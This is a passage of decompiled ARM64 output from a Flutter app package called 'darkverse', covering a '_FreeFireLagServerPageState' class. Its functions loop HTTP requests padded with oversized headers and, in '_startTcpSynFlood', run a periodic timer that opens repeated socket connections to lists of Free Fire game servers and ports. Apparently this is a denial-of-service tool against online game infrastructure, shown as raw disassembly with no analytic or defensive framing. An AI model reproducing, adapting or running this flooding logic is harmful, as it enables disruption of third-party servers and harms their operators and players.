    //     0x87cb20: b.eq            #0x87cb2c
    //     0x87cb24: bl              #0xbf7e54  ; AllocateMintSharedWithoutFPURegsStub
    //     0x87cb28: stur            x3, [x0, #7]
    // 0x87cb2c: StoreField: r2->field_13 = r0
    //     0x87cb2c: stur            w0, [x2, #0x13]
    // 0x87cb30: str             x2, [SP]
    // 0x87cb34: r0 = _interpolate()
    //     0x87cb34: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x87cb38: r1 = "B"
    //     0x87cb38: add             x1, PP, #0x1e, lsl #12  ; [pp+0x1e878] "B"
    //     0x87cb3c: ldr             x1, [x1, #0x878]
    // 0x87cb40: r2 = 1024
    //     0x87cb40: mov             x2, #0x400
    // 0x87cb44: stur            x0, [fp, #-0xc0]
    // 0x87cb48: r0 = *()
    //     0x87cb48: bl              #0x4bca54  ; [dart:core] _OneByteString::*
    // 0x87cb4c: ldur            x1, [fp, #-0xe8]
    // 0x87cb50: ldur            x2, [fp, #-0xc0]
    // 0x87cb54: mov             x3, x0
    // 0x87cb58: r4 = const [0, 0x3, 0, 0x3, null]
    //     0x87cb58: ldr             x4, [PP, #0x348]  ; [pp+0x348] List(5) [0, 0x3, 0, 0x3, Null]
    // 0x87cb5c: r0 = add()
    //     0x87cb5c: bl              #0x47f55c  ; [dart:_http] _HttpHeaders::add
    // 0x87cb60: ldur            x0, [fp, #-0xe0]
    // 0x87cb64: add             x1, x0, #1
    // 0x87cb68: mov             x0, x1
    // 0x87cb6c: b               #0x87cae0
    // 0x87cb70: ldur            x0, [fp, #-0xd8]
    // 0x87cb74: ldur            x1, [fp, #-0xf0]
    // 0x87cb78: r0 = close()
    //     0x87cb78: bl              #0x50796c  ; [dart:_http] _StreamSinkImpl::close
    // 0x87cb7c: ldur            x1, [fp, #-0xf0]
    // 0x87cb80: r0 = done()
    //     0x87cb80: bl              #0xa913a0  ; [dart:_http] _HttpClientRequest::done
    // 0x87cb84: mov             x1, x0
    // 0x87cb88: stur            x1, [fp, #-0xc0]
    // 0x87cb8c: r0 = Await()
    //     0x87cb8c: bl              #0x4a3d90  ; AwaitStub
    // 0x87cb90: mov             x3, x0
    // 0x87cb94: stur            x3, [fp, #-0xc0]
    // 0x87cb98: r0 = LoadClassIdInstr(r3)
    //     0x87cb98: ldur            x0, [x3, #-1]
    //     0x87cb9c: ubfx            x0, x0, #0xc, #0x14
    // 0x87cba0: r16 = true
    //     0x87cba0: add             x16, NULL, #0x20  ; true
    // 0x87cba4: str             x16, [SP]
    // 0x87cba8: mov             x1, x3
    // 0x87cbac: r2 = Null
    //     0x87cbac: mov             x2, NULL
    // 0x87cbb0: r4 = const [0, 0x3, 0x1, 0x2, cancelOnError, 0x2, null]
    //     0x87cbb0: ldr             x4, [PP, #0x68e8]  ; [pp+0x68e8] List(7) [0, 0x3, 0x1, 0x2, "cancelOnError", 0x2, Null]
    // 0x87cbb4: r0 = GDT[cid_x0 + -0x65]()
    //     0x87cbb4: sub             lr, x0, #0x65
    //     0x87cbb8: ldr             lr, [x21, lr, lsl #3]
    //     0x87cbbc: blr             lr
    // 0x87cbc0: r1 = LoadClassIdInstr(r0)
    //     0x87cbc0: ldur            x1, [x0, #-1]
    //     0x87cbc4: ubfx            x1, x1, #0xc, #0x14
    // 0x87cbc8: stp             x0, NULL, [SP, #8]
    // 0x87cbcc: str             NULL, [SP]
    // 0x87cbd0: mov             x0, x1
    // 0x87cbd4: r4 = const [0x1, 0x2, 0x2, 0x2, null]
    //     0x87cbd4: ldr             x4, [PP, #0x40]  ; [pp+0x40] List(5) [0x1, 0x2, 0x2, 0x2, Null]
    // 0x87cbd8: r0 = GDT[cid_x0 + 0x6b4]()
    //     0x87cbd8: add             lr, x0, #0x6b4
    //     0x87cbdc: ldr             lr, [x21, lr, lsl #3]
    //     0x87cbe0: blr             lr
    // 0x87cbe4: mov             x1, x0
    // 0x87cbe8: stur            x1, [fp, #-0xe8]
    // 0x87cbec: r0 = Await()
    //     0x87cbec: bl              #0x4a3d90  ; AwaitStub
    // 0x87cbf0: ldur            x0, [fp, #-0xd8]
    // 0x87cbf4: r3 = true
    //     0x87cbf4: add             x3, NULL, #0x20  ; true
    // 0x87cbf8: StoreField: r0->field_7 = r3
    //     0x87cbf8: stur            w3, [x0, #7]
    // 0x87cbfc: r4 = false
    //     0x87cbfc: add             x4, NULL, #0x30  ; false
    // 0x87cc00: StoreField: r0->field_b = r4
    //     0x87cc00: stur            w4, [x0, #0xb]
    // 0x87cc04: mov             x1, x0
    // 0x87cc08: mov             x2, x4
    // 0x87cc0c: r0 = _closeConnections()
    //     0x87cc0c: bl              #0x47c9e8  ; [dart:_http] _HttpClient::_closeConnections
    // 0x87cc10: r0 = LoadStaticField(0xd70)
    //     0x87cc10: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87cc14: ldr             x0, [x0, #0x1ae0]
    // 0x87cc18: r1 = LoadInt32Instr(r0)
    //     0x87cc18: sbfx            x1, x0, #1, #0x1f
    //     0x87cc1c: tbz             w0, #0, #0x87cc24
    //     0x87cc20: ldur            x1, [x0, #7]
    // 0x87cc24: add             x2, x1, #1
    // 0x87cc28: r0 = BoxInt64Instr(r2)
    //     0x87cc28: sbfiz           x0, x2, #1, #0x1f
    //     0x87cc2c: cmp             x2, x0, asr #1
    //     0x87cc30: b.eq            #0x87cc3c
    //     0x87cc34: bl              #0xbf7e54  ; AllocateMintSharedWithoutFPURegsStub
    //     0x87cc38: stur            x2, [x0, #7]
    // 0x87cc3c: mov             x2, x0
    // 0x87cc40: StoreStaticField(0xd70, r2)
    //     0x87cc40: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87cc44: str             x2, [x0, #0x1ae0]
    // 0x87cc48: r0 = LoadStaticField(0xd78)
    //     0x87cc48: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87cc4c: ldr             x0, [x0, #0x1af0]
    // 0x87cc50: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87cc54: cmp             w0, w16
    // 0x87cc58: b.ne            #0x87cc68
    // 0x87cc5c: r2 = _httpClients
    //     0x87cc5c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be68] Field <_FreeFireLagServerPageState@829239838._httpClients@829239838>: static late (offset: 0xd78)
    //     0x87cc60: ldr             x2, [x2, #0xe68]
    // 0x87cc64: r0 = InitLateStaticField()
    //     0x87cc64: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87cc68: LoadField: r1 = r0->field_b
    //     0x87cc68: ldur            w1, [x0, #0xb]
    // 0x87cc6c: r2 = LoadInt32Instr(r1)
    //     0x87cc6c: sbfx            x2, x1, #1, #0x1f
    // 0x87cc70: LoadField: r1 = r0->field_f
    //     0x87cc70: ldur            w1, [x0, #0xf]
    // 0x87cc74: DecompressPointer r1
    //     0x87cc74: add             x1, x1, HEAP, lsl #32
    // 0x87cc78: ldur            x3, [fp, #-0xd8]
    // 0x87cc7c: r4 = 0
    //     0x87cc7c: mov             x4, #0
    // 0x87cc80: CheckStackOverflow
    //     0x87cc80: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87cc84: cmp             SP, x16
    //     0x87cc88: b.ls            #0x87cd68
    // 0x87cc8c: cmp             x4, x2
    // 0x87cc90: b.ge            #0x87ccc8
    // 0x87cc94: ArrayLoad: r5 = r1[r4]  ; Unknown_4
    //     0x87cc94: add             x16, x1, x4, lsl #2
    //     0x87cc98: ldur            w5, [x16, #0xf]
    // 0x87cc9c: DecompressPointer r5
    //     0x87cc9c: add             x5, x5, HEAP, lsl #32
    // 0x87cca0: cmp             w5, w3
    // 0x87cca4: b.eq            #0x87ccb4
    // 0x87cca8: add             x5, x4, #1
    // 0x87ccac: mov             x4, x5
    // 0x87ccb0: b               #0x87cc80
    // 0x87ccb4: mov             x1, x0
    // 0x87ccb8: mov             x2, x4
    // 0x87ccbc: r0 = removeAt()
    //     0x87ccbc: bl              #0x4abe20  ; [dart:core] _GrowableList::removeAt
    // 0x87ccc0: b               #0x87ccc8
    // 0x87ccc4: sub             SP, fp, #0x108
    // 0x87ccc8: ldur            x3, [fp, #-0xb8]
    // 0x87cccc: ldur            x4, [fp, #-0xd0]
    // 0x87ccd0: ldur            x5, [fp, #-0xc8]
    // 0x87ccd4: b               #0x87c880
    // 0x87ccd8: mov             x0, x4
    // 0x87ccdc: StoreField: r0->field_1f = rNULL
    //     0x87ccdc: stur            NULL, [x0, #0x1f]
    // 0x87cce0: ldur            x4, [fp, #-0x90]
    // 0x87cce4: ldur            x6, [fp, #-0xa8]
    // 0x87cce8: ldur            x7, [fp, #-0xa0]
    // 0x87ccec: b               #0x87c7b8
    // 0x87ccf0: mov             x0, x6
    // 0x87ccf4: StoreField: r0->field_1f = rNULL
    //     0x87ccf4: stur            NULL, [x0, #0x1f]
    // 0x87ccf8: r0 = Null
    //     0x87ccf8: mov             x0, NULL
    // 0x87ccfc: r0 = ReturnAsyncNotFuture()
    //     0x87ccfc: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87cd00: mov             x0, x3
    // 0x87cd04: r0 = ConcurrentModificationError()
    //     0x87cd04: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x87cd08: mov             x1, x0
    // 0x87cd0c: ldur            x0, [fp, #-0xb8]
    // 0x87cd10: StoreField: r1->field_b = r0
    //     0x87cd10: stur            w0, [x1, #0xb]
    // 0x87cd14: mov             x0, x1
    // 0x87cd18: r0 = Throw()
    //     0x87cd18: bl              #0xbf5dcc  ; ThrowStub
    // 0x87cd1c: brk             #0
    // 0x87cd20: mov             x0, x4
    // 0x87cd24: r0 = ConcurrentModificationError()
    //     0x87cd24: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x87cd28: mov             x1, x0
    // 0x87cd2c: ldur            x0, [fp, #-0x90]
    // 0x87cd30: StoreField: r1->field_b = r0
    //     0x87cd30: stur            w0, [x1, #0xb]
    // 0x87cd34: mov             x0, x1
    // 0x87cd38: r0 = Throw()
    //     0x87cd38: bl              #0xbf5dcc  ; ThrowStub
    // 0x87cd3c: brk             #0
    // 0x87cd40: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87cd40: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87cd44: b               #0x87c74c
    // 0x87cd48: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87cd48: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87cd4c: b               #0x87c7c4
    // 0x87cd50: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x87cd50: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
    // 0x87cd54: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87cd54: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87cd58: b               #0x87c890
    // 0x87cd5c: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x87cd5c: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
    // 0x87cd60: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87cd60: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87cd64: b               #0x87caf0
    // 0x87cd68: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87cd68: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87cd6c: b               #0x87cc8c
  }
  static void _startTcpSynFlood() {
    // ** addr: 0x87cda8, size: 0xf0
    // 0x87cda8: EnterFrame
    //     0x87cda8: stp             fp, lr, [SP, #-0x10]!
    //     0x87cdac: mov             fp, SP
    // 0x87cdb0: AllocStack(0x18)
    //     0x87cdb0: sub             SP, SP, #0x18
    // 0x87cdb4: CheckStackOverflow
    //     0x87cdb4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87cdb8: cmp             SP, x16
    //     0x87cdbc: b.ls            #0x87ce90
    // 0x87cdc0: r1 = Function '<anonymous closure>': static.
    //     0x87cdc0: add             x1, PP, #0x3c, lsl #12  ; [pp+0x3c1f0] AnonymousClosure: static (0x87ce98), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startTcpSynFlood (0x87cda8)
    //     0x87cdc4: ldr             x1, [x1, #0x1f0]
    // 0x87cdc8: r2 = Null
    //     0x87cdc8: mov             x2, NULL
    // 0x87cdcc: r0 = AllocateClosure()
    //     0x87cdcc: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x87cdd0: mov             x3, x0
    // 0x87cdd4: r1 = Null
    //     0x87cdd4: mov             x1, NULL
    // 0x87cdd8: r2 = Instance_Duration
    //     0x87cdd8: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bea8] Obj!Duration@a44471
    //     0x87cddc: ldr             x2, [x2, #0xea8]
    // 0x87cde0: r0 = Timer.periodic()
    //     0x87cde0: bl              #0x570930  ; [dart:async] Timer::Timer.periodic
    // 0x87cde4: stur            x0, [fp, #-8]
    // 0x87cde8: r0 = LoadStaticField(0xd74)
    //     0x87cde8: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87cdec: ldr             x0, [x0, #0x1ae8]
    // 0x87cdf0: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87cdf4: cmp             w0, w16
    // 0x87cdf8: b.ne            #0x87ce08
    // 0x87cdfc: r2 = _timers
    //     0x87cdfc: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be60] Field <_FreeFireLagServerPageState@829239838._timers@829239838>: static late (offset: 0xd74)
    //     0x87ce00: ldr             x2, [x2, #0xe60]
    // 0x87ce04: r0 = InitLateStaticField()
    //     0x87ce04: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87ce08: stur            x0, [fp, #-0x18]
    // 0x87ce0c: LoadField: r1 = r0->field_b
    //     0x87ce0c: ldur            w1, [x0, #0xb]
    // 0x87ce10: LoadField: r2 = r0->field_f
    //     0x87ce10: ldur            w2, [x0, #0xf]
    // 0x87ce14: DecompressPointer r2
    //     0x87ce14: add             x2, x2, HEAP, lsl #32
    // 0x87ce18: LoadField: r3 = r2->field_b
    //     0x87ce18: ldur            w3, [x2, #0xb]
    // 0x87ce1c: r2 = LoadInt32Instr(r1)
    //     0x87ce1c: sbfx            x2, x1, #1, #0x1f
    // 0x87ce20: stur            x2, [fp, #-0x10]
    // 0x87ce24: r1 = LoadInt32Instr(r3)
    //     0x87ce24: sbfx            x1, x3, #1, #0x1f
    // 0x87ce28: cmp             x2, x1
    // 0x87ce2c: b.ne            #0x87ce38
    // 0x87ce30: mov             x1, x0
    // 0x87ce34: r0 = _growToNextCapacity()
    //     0x87ce34: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87ce38: ldur            x2, [fp, #-0x18]
    // 0x87ce3c: ldur            x3, [fp, #-0x10]
    // 0x87ce40: add             x4, x3, #1
    // 0x87ce44: lsl             x5, x4, #1
    // 0x87ce48: StoreField: r2->field_b = r5
    //     0x87ce48: stur            w5, [x2, #0xb]
    // 0x87ce4c: LoadField: r1 = r2->field_f
    //     0x87ce4c: ldur            w1, [x2, #0xf]
    // 0x87ce50: DecompressPointer r1
    //     0x87ce50: add             x1, x1, HEAP, lsl #32
    // 0x87ce54: ldur            x0, [fp, #-8]
    // 0x87ce58: ArrayStore: r1[r3] = r0  ; List_4
    //     0x87ce58: add             x25, x1, x3, lsl #2
    //     0x87ce5c: add             x25, x25, #0xf
    //     0x87ce60: str             w0, [x25]
    //     0x87ce64: tbz             w0, #0, #0x87ce80
    //     0x87ce68: ldurb           w16, [x1, #-1]
    //     0x87ce6c: ldurb           w17, [x0, #-1]
    //     0x87ce70: and             x16, x17, x16, lsr #2
    //     0x87ce74: tst             x16, HEAP, lsr #32
    //     0x87ce78: b.eq            #0x87ce80
    //     0x87ce7c: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87ce80: r0 = Null
    //     0x87ce80: mov             x0, NULL
    // 0x87ce84: LeaveFrame
    //     0x87ce84: mov             SP, fp
    //     0x87ce88: ldp             fp, lr, [SP], #0x10
    // 0x87ce8c: ret
    //     0x87ce8c: ret             
    // 0x87ce90: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87ce90: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87ce94: b               #0x87cdc0
  }
  [closure] static Future<void> <anonymous closure>(dynamic, Timer) async {
    // ** addr: 0x87ce98, size: 0x524
    // 0x87ce98: EnterFrame
    //     0x87ce98: stp             fp, lr, [SP, #-0x10]!
    //     0x87ce9c: mov             fp, SP
    // 0x87cea0: AllocStack(0xf0)
    //     0x87cea0: sub             SP, SP, #0xf0
    // 0x87cea4: SetupParameters(dynamic _ /* r1 */)
    //     0x87cea4: stur            NULL, [fp, #-8]
    //     0x87cea8: mov             x0, #0
    //     0x87ceac: add             x1, fp, w0, sxtw #2
    //     0x87ceb0: ldr             x1, [x1, #0x18]
    //     0x87ceb4: ldur            w2, [x1, #0x17]
    //     0x87ceb8: add             x2, x2, HEAP, lsl #32
    //     0x87cebc: stur            x2, [fp, #-0x80]
    // 0x87cec0: CheckStackOverflow
    //     0x87cec0: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87cec4: cmp             SP, x16
    //     0x87cec8: b.ls            #0x87d394
    // 0x87cecc: InitAsync() -> Future<void?>
    //     0x87cecc: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x87ced0: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x87ced4: r0 = LoadStaticField(0xd6c)
    //     0x87ced4: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87ced8: ldr             x0, [x0, #0x1ad8]
    // 0x87cedc: tbz             w0, #4, #0x87cee8
    // 0x87cee0: r0 = Null
    //     0x87cee0: mov             x0, NULL
    // 0x87cee4: r0 = ReturnAsyncNotFuture()
    //     0x87cee4: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87cee8: r0 = LoadStaticField(0xd84)
    //     0x87cee8: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87ceec: ldr             x0, [x0, #0x1b08]
    // 0x87cef0: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87cef4: cmp             w0, w16
    // 0x87cef8: b.ne            #0x87cf08
    // 0x87cefc: r2 = freefireServers
    //     0x87cefc: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bd98] Field <_FreeFireLagServerPageState@829239838.freefireServers>: static late final (offset: 0xd84)
    //     0x87cf00: ldr             x2, [x2, #0xd98]
    // 0x87cf04: r0 = InitLateFinalStaticField()
    //     0x87cf04: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x87cf08: r1 = <String>
    //     0x87cf08: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87cf0c: stur            x0, [fp, #-0x88]
    // 0x87cf10: r0 = ListIterator()
    //     0x87cf10: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x87cf14: mov             x3, x0
    // 0x87cf18: ldur            x2, [fp, #-0x88]
    // 0x87cf1c: stur            x3, [fp, #-0xa0]
    // 0x87cf20: StoreField: r3->field_b = r2
    //     0x87cf20: stur            w2, [x3, #0xb]
    // 0x87cf24: LoadField: r0 = r2->field_b
    //     0x87cf24: ldur            w0, [x2, #0xb]
    // 0x87cf28: r4 = LoadInt32Instr(r0)
    //     0x87cf28: sbfx            x4, x0, #1, #0x1f
    // 0x87cf2c: stur            x4, [fp, #-0x98]
    // 0x87cf30: StoreField: r3->field_f = r4
    //     0x87cf30: stur            x4, [x3, #0xf]
    // 0x87cf34: ArrayStore: r3[0] = rZR  ; List_8
    //     0x87cf34: stur            xzr, [x3, #0x17]
    // 0x87cf38: ldur            x5, [fp, #-0x80]
    // 0x87cf3c: stur            x5, [fp, #-0x90]
    // 0x87cf40: CheckStackOverflow
    //     0x87cf40: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87cf44: cmp             SP, x16
    //     0x87cf48: b.ls            #0x87d39c
    // 0x87cf4c: LoadField: r0 = r2->field_b
    //     0x87cf4c: ldur            w0, [x2, #0xb]
    // 0x87cf50: r1 = LoadInt32Instr(r0)
    //     0x87cf50: sbfx            x1, x0, #1, #0x1f
    // 0x87cf54: cmp             x4, x1
    // 0x87cf58: b.ne            #0x87d374
    // 0x87cf5c: ArrayLoad: r6 = r3[0]  ; List_8
    //     0x87cf5c: ldur            x6, [x3, #0x17]
    // 0x87cf60: cmp             x6, x1
    // 0x87cf64: b.ge            #0x87d344
    // 0x87cf68: mov             x0, x1
    // 0x87cf6c: mov             x1, x6
    // 0x87cf70: cmp             x1, x0
    // 0x87cf74: b.hs            #0x87d3a4
    // 0x87cf78: LoadField: r0 = r2->field_f
    //     0x87cf78: ldur            w0, [x2, #0xf]
    // 0x87cf7c: DecompressPointer r0
    //     0x87cf7c: add             x0, x0, HEAP, lsl #32
    // 0x87cf80: ArrayLoad: r1 = r0[r6]  ; Unknown_4
    //     0x87cf80: add             x16, x0, x6, lsl #2
    //     0x87cf84: ldur            w1, [x16, #0xf]
    // 0x87cf88: DecompressPointer r1
    //     0x87cf88: add             x1, x1, HEAP, lsl #32
    // 0x87cf8c: mov             x0, x1
    // 0x87cf90: stur            x1, [fp, #-0x80]
    // 0x87cf94: StoreField: r3->field_1f = r0
    //     0x87cf94: stur            w0, [x3, #0x1f]
    //     0x87cf98: ldurb           w16, [x3, #-1]
    //     0x87cf9c: ldurb           w17, [x0, #-1]
    //     0x87cfa0: and             x16, x17, x16, lsr #2
    //     0x87cfa4: tst             x16, HEAP, lsr #32
    //     0x87cfa8: b.eq            #0x87cfb0
    //     0x87cfac: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x87cfb0: add             x0, x6, #1
    // 0x87cfb4: ArrayStore: r3[0] = r0  ; List_8
    //     0x87cfb4: stur            x0, [x3, #0x17]
    // 0x87cfb8: r0 = LoadStaticField(0xd88)
    //     0x87cfb8: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87cfbc: ldr             x0, [x0, #0x1b10]
    // 0x87cfc0: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87cfc4: cmp             w0, w16
    // 0x87cfc8: b.ne            #0x87cfd8
    // 0x87cfcc: r2 = ports
    //     0x87cfcc: add             x2, PP, #0x3c, lsl #12  ; [pp+0x3c1f8] Field <_FreeFireLagServerPageState@829239838.ports>: static late final (offset: 0xd88)
    //     0x87cfd0: ldr             x2, [x2, #0x1f8]
    // 0x87cfd4: r0 = InitLateFinalStaticField()
    //     0x87cfd4: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x87cfd8: r1 = <int>
    //     0x87cfd8: ldr             x1, [PP, #0xed0]  ; [pp+0xed0] TypeArguments: <int>
    // 0x87cfdc: stur            x0, [fp, #-0xa8]
    // 0x87cfe0: r0 = ListIterator()
    //     0x87cfe0: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x87cfe4: mov             x3, x0
    // 0x87cfe8: ldur            x2, [fp, #-0xa8]
    // 0x87cfec: stur            x3, [fp, #-0xc0]
    // 0x87cff0: StoreField: r3->field_b = r2
    //     0x87cff0: stur            w2, [x3, #0xb]
    // 0x87cff4: LoadField: r0 = r2->field_b
    //     0x87cff4: ldur            w0, [x2, #0xb]
    // 0x87cff8: r4 = LoadInt32Instr(r0)
    //     0x87cff8: sbfx            x4, x0, #1, #0x1f
    // 0x87cffc: stur            x4, [fp, #-0xb8]
    // 0x87d000: StoreField: r3->field_f = r4
    //     0x87d000: stur            x4, [x3, #0xf]
    // 0x87d004: ArrayStore: r3[0] = rZR  ; List_8
    //     0x87d004: stur            xzr, [x3, #0x17]
    // 0x87d008: ldur            x5, [fp, #-0x90]
    // 0x87d00c: stur            x5, [fp, #-0xb0]
    // 0x87d010: CheckStackOverflow
    //     0x87d010: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87d014: cmp             SP, x16
    //     0x87d018: b.ls            #0x87d3a8
    // 0x87d01c: LoadField: r0 = r2->field_b
    //     0x87d01c: ldur            w0, [x2, #0xb]
    // 0x87d020: r1 = LoadInt32Instr(r0)
    //     0x87d020: sbfx            x1, x0, #1, #0x1f
    // 0x87d024: cmp             x4, x1
    // 0x87d028: b.ne            #0x87d354
    // 0x87d02c: ArrayLoad: r6 = r3[0]  ; List_8
    //     0x87d02c: ldur            x6, [x3, #0x17]
    // 0x87d030: cmp             x6, x1
    // 0x87d034: b.ge            #0x87d328
    // 0x87d038: mov             x0, x1
    // 0x87d03c: mov             x1, x6
    // 0x87d040: cmp             x1, x0
    // 0x87d044: b.hs            #0x87d3b0
    // 0x87d048: LoadField: r0 = r2->field_f
    //     0x87d048: ldur            w0, [x2, #0xf]
    // 0x87d04c: DecompressPointer r0
    //     0x87d04c: add             x0, x0, HEAP, lsl #32
    // 0x87d050: ArrayLoad: r1 = r0[r6]  ; Unknown_4
    //     0x87d050: add             x16, x0, x6, lsl #2
    //     0x87d054: ldur            w1, [x16, #0xf]
    // 0x87d058: DecompressPointer r1
    //     0x87d058: add             x1, x1, HEAP, lsl #32
    // 0x87d05c: mov             x0, x1
    // 0x87d060: stur            x1, [fp, #-0x90]
    // 0x87d064: StoreField: r3->field_1f = r0
    //     0x87d064: stur            w0, [x3, #0x1f]
    //     0x87d068: tbz             w0, #0, #0x87d084
    //     0x87d06c: ldurb           w16, [x3, #-1]
    //     0x87d070: ldurb           w17, [x0, #-1]
    //     0x87d074: and             x16, x17, x16, lsr #2
    //     0x87d078: tst             x16, HEAP, lsr #32
    //     0x87d07c: b.eq            #0x87d084
    //     0x87d080: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x87d084: add             x0, x6, #1
    // 0x87d088: ArrayStore: r3[0] = r0  ; List_8
    //     0x87d088: stur            x0, [x3, #0x17]
    // 0x87d08c: r1 = 1
    //     0x87d08c: mov             x1, #1
    // 0x87d090: r0 = AllocateContext()
    //     0x87d090: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x87d094: ldur            x5, [fp, #-0xb0]
    // 0x87d098: stur            x0, [fp, #-0xc8]
    // 0x87d09c: StoreField: r0->field_b = r5
    //     0x87d09c: stur            w5, [x0, #0xb]
    // 0x87d0a0: r0 = current()
    //     0x87d0a0: bl              #0x46ef0c  ; [dart:io] IOOverrides::current
    // 0x87d0a4: ldur            x0, [fp, #-0x90]
    // 0x87d0a8: r2 = LoadInt32Instr(r0)
    //     0x87d0a8: sbfx            x2, x0, #1, #0x1f
    //     0x87d0ac: tbz             w0, #0, #0x87d0b4
    //     0x87d0b0: ldur            x2, [x0, #7]
    // 0x87d0b4: ldur            x1, [fp, #-0x80]
    // 0x87d0b8: r3 = Instance_Duration
    //     0x87d0b8: ldr             x3, [PP, #0x588]  ; [pp+0x588] Obj!Duration@a44141
    // 0x87d0bc: r0 = _connect()
    //     0x87d0bc: bl              #0x78128c  ; [dart:io] Socket::_connect
    // 0x87d0c0: mov             x1, x0
    // 0x87d0c4: stur            x1, [fp, #-0xd0]
    // 0x87d0c8: r0 = Await()
    //     0x87d0c8: bl              #0x4a3d90  ; AwaitStub
    // 0x87d0cc: mov             x1, x0
    // 0x87d0d0: ldur            x2, [fp, #-0xc8]
    // 0x87d0d4: stur            x1, [fp, #-0xd0]
    // 0x87d0d8: StoreField: r2->field_f = r0
    //     0x87d0d8: stur            w0, [x2, #0xf]
    //     0x87d0dc: tbz             w0, #0, #0x87d0f8
    //     0x87d0e0: ldurb           w16, [x2, #-1]
    //     0x87d0e4: ldurb           w17, [x0, #-1]
    //     0x87d0e8: and             x16, x17, x16, lsr #2
    //     0x87d0ec: tst             x16, HEAP, lsr #32
    //     0x87d0f0: b.eq            #0x87d0f8
    //     0x87d0f4: bl              #0xbf6254  ; WriteBarrierWrappersStub
    // 0x87d0f8: r0 = LoadStaticField(0xd80)
    //     0x87d0f8: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87d0fc: ldr             x0, [x0, #0x1b00]
    // 0x87d100: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87d104: cmp             w0, w16
    // 0x87d108: b.ne            #0x87d118
    // 0x87d10c: r2 = _tcpSockets
    //     0x87d10c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be78] Field <_FreeFireLagServerPageState@829239838._tcpSockets@829239838>: static late (offset: 0xd80)
    //     0x87d110: ldr             x2, [x2, #0xe78]
    // 0x87d114: r0 = InitLateStaticField()
    //     0x87d114: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87d118: stur            x0, [fp, #-0xe8]
    // 0x87d11c: LoadField: r2 = r0->field_b
    //     0x87d11c: ldur            w2, [x0, #0xb]
    // 0x87d120: stur            x2, [fp, #-0xe0]
    // 0x87d124: LoadField: r1 = r0->field_f
    //     0x87d124: ldur            w1, [x0, #0xf]
    // 0x87d128: DecompressPointer r1
    //     0x87d128: add             x1, x1, HEAP, lsl #32
    // 0x87d12c: LoadField: r3 = r1->field_b
    //     0x87d12c: ldur            w3, [x1, #0xb]
    // 0x87d130: r4 = LoadInt32Instr(r2)
    //     0x87d130: sbfx            x4, x2, #1, #0x1f
    // 0x87d134: stur            x4, [fp, #-0xd8]
    // 0x87d138: r1 = LoadInt32Instr(r3)
    //     0x87d138: sbfx            x1, x3, #1, #0x1f
    // 0x87d13c: cmp             x4, x1
    // 0x87d140: b.ne            #0x87d14c
